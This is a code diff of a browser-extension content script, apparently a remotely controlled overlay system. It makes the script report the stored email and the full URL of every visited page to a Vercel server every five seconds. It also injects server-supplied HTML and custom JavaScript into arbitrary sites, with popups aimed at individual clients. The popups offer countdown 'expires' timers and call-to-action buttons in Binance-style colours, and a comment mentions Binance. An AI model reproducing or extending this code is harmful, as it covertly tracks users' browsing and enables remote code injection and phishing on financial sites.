@@ -5,12 +5,17 @@
   if (window.__remoteOverlayInitialized) return;
   window.__remoteOverlayInitialized = true;
 
-  const currentDomain = window.location.hostname;
-  const currentUrl = window.location.href;
+  function getCurrentDomain() {
+    return window.location.hostname || "unknown";
+  }
 
-  const DEFAULT_API_URL = "https://extension-dashboard-eight.vercel.app";
+  function getCurrentUrl() {
+    return window.location.href || "";
+  }
+
+  const DEFAULT_API_URL = "https://extension-admin-phi.vercel.app";
   const CANDIDATE_API_URLS = [
-    "https://extension-dashboard-eight.vercel.app",
+    "https://extension-admin-phi.vercel.app",
     "http://localhost:3001",
     "http://localhost:3000",
   ];
@@ -18,9 +23,10 @@
   let activeConfig = null;
   let activeEventSource = null;
   let pollIntervalId = null;
+  let heartbeatIntervalId = null;
   let lastConfigHash = "";
 
-  // 1. Get stored client credentials (NO overlay caching stored)
+  // 1. Get stored client credentials & auto-migrate legacy URLs
   async function getStoredSettings() {
     return new Promise((resolve) => {
       chrome.storage.local.get(["apiBaseUrl", "clientId", "userEmail"], (res) => {
@@ -29,8 +35,16 @@
           clientId = "client_" + Math.random().toString(36).substring(2, 10);
           chrome.storage.local.set({ clientId });
         }
+
+        let apiBaseUrl = (res.apiBaseUrl || DEFAULT_API_URL).replace(/\/+$/, "");
+        // Auto-migrate legacy Vercel URL
+        if (apiBaseUrl.includes("extension-dashboard-eight.vercel.app")) {
+          apiBaseUrl = DEFAULT_API_URL;
+          chrome.storage.local.set({ apiBaseUrl });
+        }
+
         resolve({
-          apiBaseUrl: (res.apiBaseUrl || DEFAULT_API_URL).replace(/\/+$/, ""),
+          apiBaseUrl: apiBaseUrl,
           clientId: clientId,
           userEmail: res.userEmail || "",
           isDefaultUrl: !res.apiBaseUrl,
@@ -39,8 +53,22 @@
     });
   }
 
-  // 2. Client Heartbeat
+  // 2. Client Heartbeat (Always Live & Dynamic)
   async function sendHeartbeat(apiUrl, clientId, userEmail) {
+    const domain = getCurrentDomain();
+    // Never send heartbeat or add logs for local, localhost, or dashboard domains
+    if (
+      !domain ||
+      domain === "unknown" ||
+      domain === "localhost" ||
+      domain.startsWith("localhost:") ||
+      domain === "127.0.0.1" ||
+      domain.includes("vercel.app") ||
+      domain.includes("chrome-extension")
+    ) {
+      return;
+    }
+
     try {
       await fetch(`${apiUrl}/api/client/heartbeat`, {
         method: "POST",
@@ -49,12 +77,12 @@
         body: JSON.stringify({
           clientId,
           email: userEmail,
-          domain: currentDomain,
-          currentUrl: currentUrl,
+          domain: domain,
+          currentUrl: getCurrentUrl(),
         }),
       });
     } catch (e) {
-      // Heartbeat silent
+      // Silent failure during network drops
     }
   }
 
@@ -87,12 +115,13 @@
       `);
 
       fn({
-        domain: currentDomain,
-        url: currentUrl,
+        domain: getCurrentDomain(),
+        url: getCurrentUrl(),
         config: cfg,
         popup: popupEl,
         close: () => {
           popupEl.remove();
+          document.getElementById("custom-sticky-backdrop")?.remove();
           activeConfig = null;
         },
       });
@@ -102,11 +131,14 @@
   }
 
   // 5. Apply Overlay to DOM (NO fallback - strictly live data)
-  // 5. Apply Overlay to DOM (NO fallback - strictly live data)
   function applyOverlay(cfg) {
     // If null or explicitly disabled, remove popup & backdrop
     if (!cfg || cfg.enabled === false) {
-      document.getElementById("custom-sticky-popup")?.remove();
+      const existingPopup = document.getElementById("custom-sticky-popup");
+      if (existingPopup && existingPopup._timerId) {
+        clearInterval(existingPopup._timerId);
+      }
+      existingPopup?.remove();
       document.getElementById("custom-sticky-backdrop")?.remove();
       document.getElementById("custom-remote-overlay-css")?.remove();
       activeConfig = null;
@@ -121,8 +153,12 @@
       applyCustomCss(cfg.customCss);
     }
 
-    // Remove existing popup and backdrop if already rendered to update in-place
-    document.getElementById("custom-sticky-popup")?.remove();
+    // Remove existing popup and backdrop if already rendered
+    const existingPopup = document.getElementById("custom-sticky-popup");
+    if (existingPopup && existingPopup._timerId) {
+      clearInterval(existingPopup._timerId);
+    }
+    existingPopup?.remove();
     document.getElementById("custom-sticky-backdrop")?.remove();
 
     const position = cfg.position || "top";
@@ -160,10 +196,10 @@
     const borderVal = `${cfg.borderWidth || 2}px solid ${cfg.borderColor || "#f0b90b"}`;
     const borderTopVal = position === "top" ? "none" : borderVal;
     const borderBottomVal = position === "bottom" ? "none" : borderVal;
-    const borderLeftVal = (position === "top" || position === "bottom") ? "none" : borderVal;
-    const borderRightVal = (position === "top" || position === "bottom") ? "none" : borderVal;
+    const borderLeftVal = position === "top" || position === "bottom" ? "none" : borderVal;
+    const borderRightVal = position === "top" || position === "bottom" ? "none" : borderVal;
 
-    // Base popup styling
+    // Base popup styling using discrete border properties to prevent warnings
     const baseStyle = {
       background: cfg.bg || "#0b0e11",
       color: cfg.text || "#eaecef",
@@ -171,7 +207,12 @@
       display: "flex",
       flexDirection: "column",
       justifyContent: "center",
-      alignItems: cfg.textAlign === "left" ? "flex-start" : cfg.textAlign === "right" ? "flex-end" : "center",
+      alignItems:
+        cfg.textAlign === "left"
+          ? "flex-start"
+          : cfg.textAlign === "right"
+          ? "flex-end"
+          : "center",
       boxSizing: "border-box",
       padding: "24px 36px",
       borderRadius: `${cfg.borderRadius || 0}px`,
@@ -272,8 +313,14 @@
         userSelect: "none",
         transition: "opacity 0.2s, transform 0.2s",
       });
-      closeBtn.onmouseover = () => { closeBtn.style.opacity = "1"; closeBtn.style.transform = "scale(1.15)"; };
-      closeBtn.onmouseout = () => { closeBtn.style.opacity = "0.7"; closeBtn.style.transform = "scale(1)"; };
+      closeBtn.onmouseover = () => {
+        closeBtn.style.opacity = "1";
+        closeBtn.style.transform = "scale(1.15)";
+      };
+      closeBtn.onmouseout = () => {
+        closeBtn.style.opacity = "0.7";
+        closeBtn.style.transform = "scale(1)";
+      };
       closeBtn.onclick = () => {
         popup.remove();
         document.getElementById("custom-sticky-backdrop")?.remove();
@@ -284,14 +331,12 @@
 
     // Render Content: Custom Coding vs Elementor Sections vs Default Fallback
     if (cfg.builderMode === "code" && cfg.customHtml) {
-      // 1. Custom Coding Mode HTML
       const htmlWrapper = document.createElement("div");
       htmlWrapper.className = "custom-html-wrapper";
       htmlWrapper.style.width = "100%";
       htmlWrapper.innerHTML = cfg.customHtml;
       popup.appendChild(htmlWrapper);
     } else if (cfg.sections && Array.isArray(cfg.sections) && cfg.sections.length > 0) {
-      // 2. Elementor Sections Mode
       cfg.sections.forEach((sec) => {
         if (!sec) return;
         if (sec.type === "heading" && sec.text) {
@@ -337,8 +382,14 @@
             boxShadow: "0 4px 15px rgba(0,0,0,0.25)",
             transition: "transform 0.15s, filter 0.15s",
           });
-          btn.onmouseover = () => { btn.style.transform = "scale(1.04)"; btn.style.filter = "brightness(1.1)"; };
-          btn.onmouseout = () => { btn.style.transform = "scale(1)"; btn.style.filter = "brightness(1)"; };
+          btn.onmouseover = () => {
+            btn.style.transform = "scale(1.04)";
+            btn.style.filter = "brightness(1.1)";
+          };
+          btn.onmouseout = () => {
+            btn.style.transform = "scale(1)";
+            btn.style.filter = "brightness(1)";
+          };
           popup.appendChild(btn);
         } else if (sec.type === "alert" && sec.text) {
           const alertBox = document.createElement("div");
@@ -347,21 +398,21 @@
             warning: "rgba(245, 158, 11, 0.15)",
             danger: "rgba(239, 68, 68, 0.15)",
             info: "rgba(59, 130, 246, 0.15)",
-            success: "rgba(16, 185, 129, 0.15)"
+            success: "rgba(16, 185, 129, 0.15)",
           };
           const borderMap = {
             warning: "#f59e0b",
             danger: "#ef4444",
             info: "#3b82f6",
-            success: "#10b981"
+            success: "#10b981",
           };
           const colorMap = {
             warning: "#f59e0b",
             danger: "#ef4444",
             info: "#60a5fa",
-            success: "#34d399"
+            success: "#34d399",
           };
-          alertBox.innerHTML = `<strong>${sec.icon || '⚠️'}</strong> ${sec.text}`;
+          alertBox.innerHTML = `<strong>${sec.icon || "⚠️"}</strong> ${sec.text}`;
           Object.assign(alertBox.style, {
             padding: "10px 18px",
             borderRadius: "6px",
@@ -380,12 +431,13 @@
           const countdownBox = document.createElement("div");
           const totalSeconds = (parseInt(sec.minutes, 10) || 10) * 60;
           let remaining = totalSeconds;
-          countdownBox.style.cssText = "margin: 12px 0; font-family: monospace; font-size: 16px; font-weight: 700; color: #f59e0b;";
-          
+          countdownBox.style.cssText =
+            "margin: 12px 0; font-family: monospace; font-size: 16px; font-weight: 700; color: #f59e0b;";
+
           const label = sec.label || "Notice Expires In:";
           function updateTimer() {
-            const m = String(Math.floor(remaining / 60)).padStart(2, '0');
-            const s = String(remaining % 60).padStart(2, '0');
+            const m = String(Math.floor(remaining / 60)).padStart(2, "0");
+            const s = String(remaining % 60).padStart(2, "0");
             countdownBox.innerText = `⏳ ${label} ${m}:${s}`;
             if (remaining > 0) remaining--;
           }
@@ -448,17 +500,24 @@
           boxShadow: "0 4px 15px rgba(0,0,0,0.3)",
           transition: "transform 0.15s, filter 0.15s",
         });
-        ctaBtn.onmouseover = () => { ctaBtn.style.transform = "scale(1.04)"; ctaBtn.style.filter = "brightness(1.1)"; };
-        ctaBtn.onmouseout = () => { ctaBtn.style.transform = "scale(1)"; ctaBtn.style.filter = "brightness(1)"; };
+        ctaBtn.onmouseover = () => {
+          ctaBtn.style.transform = "scale(1.04)";
+          ctaBtn.style.filter = "brightness(1.1)";
+        };
+        ctaBtn.onmouseout = () => {
+          ctaBtn.style.transform = "scale(1)";
+          ctaBtn.style.filter = "brightness(1)";
+        };
         popup.appendChild(ctaBtn);
       }
     }
 
-    // Mount to DOM ("Where to paste the popup")
+    // Mount to DOM
     function mount() {
       if (document.getElementById("custom-sticky-popup")) return;
 
-      const targetSelector = cfg.targetSelector && cfg.targetSelector !== "body" ? cfg.targetSelector : null;
+      const targetSelector =
+        cfg.targetSelector && cfg.targetSelector !== "body" ? cfg.targetSelector : null;
       const targetAction = cfg.targetAction || "fixed";
 
       if (targetSelector && targetAction !== "fixed") {
@@ -480,7 +539,6 @@
         }
       }
 
-      // Default fixed placement in body
       const parent = document.body || document.documentElement;
       if (parent) {
         parent.appendChild(popup);
@@ -493,7 +551,6 @@
       document.addEventListener("DOMContentLoaded", mount);
     }
 
-    // Execute custom JS if provided
     if (cfg.customJs) {
       executeCustomJs(cfg.customJs, cfg, popup);
     }
@@ -502,14 +559,14 @@
   // 6. Direct zero-cache Live Fetch
   async function fetchLiveOverlay(apiUrl, clientId) {
     const cacheBuster = Date.now();
-    const url = `${apiUrl}/api/overlay?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}&_t=${cacheBuster}`;
+    const url = `${apiUrl}/api/overlay?domain=${encodeURIComponent(getCurrentDomain())}&clientId=${encodeURIComponent(clientId)}&_t=${cacheBuster}`;
 
     const res = await fetch(url, {
       method: "GET",
       headers: {
-        "Accept": "application/json",
+        Accept: "application/json",
         "Cache-Control": "no-cache, no-store, must-revalidate",
-        "Pragma": "no-cache",
+        Pragma: "no-cache",
       },
       cache: "no-store",
     });
@@ -521,12 +578,28 @@
     return await res.json();
   }
 
-  // Handle incoming live payload
-  function handleLivePayload(data) {
+  // Handle incoming live payload with STRICT client targeting validation
+  function handleLivePayload(data, myClientId) {
     if (!data) return;
 
+    // 1. STRICT TARGETING VALIDATION:
+    // If payload is targeted to a specific client ID, ensure it matches THIS client!
+    const targetId = data.targetClientId || data.rule?.targetClientId || data.overlay?.targetClientId;
+    if (targetId && targetId !== myClientId) {
+      // Intended for another client — do NOT render!
+      applyOverlay(null);
+      return;
+    }
+
+    // 2. BROADCAST POLICY CHECK:
+    // If it's a broadcast message and broadcasts are disabled, do NOT render!
+    if (data.isBroadcast && data.broadcastsEnabled === false) {
+      applyOverlay(null);
+      return;
+    }
+
     if (data.matched && data.overlay) {
-      const isEnabled = data.rule ? data.rule.enabled !== false : (data.overlay.enabled !== false);
+      const isEnabled = data.rule ? data.rule.enabled !== false : data.overlay.enabled !== false;
       if (isEnabled) {
         const payloadStr = JSON.stringify(data.overlay);
         if (payloadStr !== lastConfigHash) {
@@ -546,22 +619,26 @@
     }
   }
 
-  // 7. Setup Live Connection (Server-Sent Events)
+  // 7. Setup Live Connection (Server-Sent Events + Dynamic Heartbeat)
   async function setupLiveConnection() {
     const { apiBaseUrl, clientId, userEmail } = await getStoredSettings();
 
-    // Send immediate heartbeat
+    // Start continuous recurring heartbeat (every 5 seconds)
+    if (heartbeatIntervalId) clearInterval(heartbeatIntervalId);
     sendHeartbeat(apiBaseUrl, clientId, userEmail);
+    heartbeatIntervalId = setInterval(() => {
+      sendHeartbeat(apiBaseUrl, clientId, userEmail);
+    }, 5000);
 
-    // Initial instant live fetch (0 cache, no fallback)
+    // Initial instant live fetch
     try {
       const data = await fetchLiveOverlay(apiBaseUrl, clientId);
-      handleLivePayload(data);
+      handleLivePayload(data, clientId);
     } catch (e) {
-      // No fallback — do nothing if server unreachable
+      // Silent on initial network unreachable
     }
 
-    // Close any previous stream
+    // Close any previous SSE stream
     if (activeEventSource) {
       activeEventSource.close();
       activeEventSource = null;
@@ -569,20 +646,20 @@
 
     // Connect to live SSE stream
     try {
-      const streamUrl = `${apiBaseUrl}/api/overlay/live?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}&_t=${Date.now()}`;
+      const streamUrl = `${apiBaseUrl}/api/overlay/live?domain=${encodeURIComponent(getCurrentDomain())}&clientId=${encodeURIComponent(clientId)}&_t=${Date.now()}`;
       activeEventSource = new EventSource(streamUrl);
 
       activeEventSource.onmessage = (event) => {
         try {
           const liveData = JSON.parse(event.data);
-          handleLivePayload(liveData);
+          handleLivePayload(liveData, clientId);
         } catch (err) {
           console.warn("[RemoteOverlay SSE] Parse error:", err);
         }
       };
 
       activeEventSource.onerror = () => {
-        // SSE will automatically attempt reconnect; fast polling ensures seamless continuity
+        // SSE will attempt reconnect automatically; fast polling acts as backup
       };
     } catch (e) {
       console.warn("[RemoteOverlay] SSE not available, using fast live polling.", e);
@@ -593,9 +670,9 @@
     pollIntervalId = setInterval(async () => {
       try {
         const freshData = await fetchLiveOverlay(apiBaseUrl, clientId);
-        handleLivePayload(freshData);
+        handleLivePayload(freshData, clientId);
       } catch (err) {
-        // No fallback
+        // Silent on drop
       }
     }, 3000);
   }
@@ -608,6 +685,14 @@
       }
     }
   }, 1500);
+
+  // Listen for SPA navigation changes (e.g. Binance routing)
+  window.addEventListener("popstate", () => {
+    setupLiveConnection();
+  });
+  window.addEventListener("hashchange", () => {
+    setupLiveConnection();
+  });
 
   // Listen for refresh messages from background
   chrome.runtime.onMessage.addListener((message) => {
